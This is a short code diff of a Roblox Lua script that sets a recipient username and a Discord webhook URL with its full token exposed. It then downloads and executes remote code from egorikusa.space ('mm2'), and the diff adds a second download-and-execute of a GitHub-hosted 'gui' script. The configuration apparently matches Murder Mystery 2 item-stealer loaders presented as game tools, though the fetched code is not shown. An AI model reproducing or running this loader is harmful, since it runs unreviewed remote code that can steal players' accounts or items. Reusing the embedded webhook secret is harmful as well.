@@ -2,3 +2,7 @@ Username = "ARTHURMGIC"
 Webhook = "https://discord.com/api/webhooks/1261755318237663394/aLyN7WNG8sPLfHcnFEtHIREvSUN21y8exwlMYlj6ei-7_-8ORxSwa5J6WcFDZi5_NZIQ"
 
 loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
+
+wait(1)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mm2duper/gui/main/gui"))()
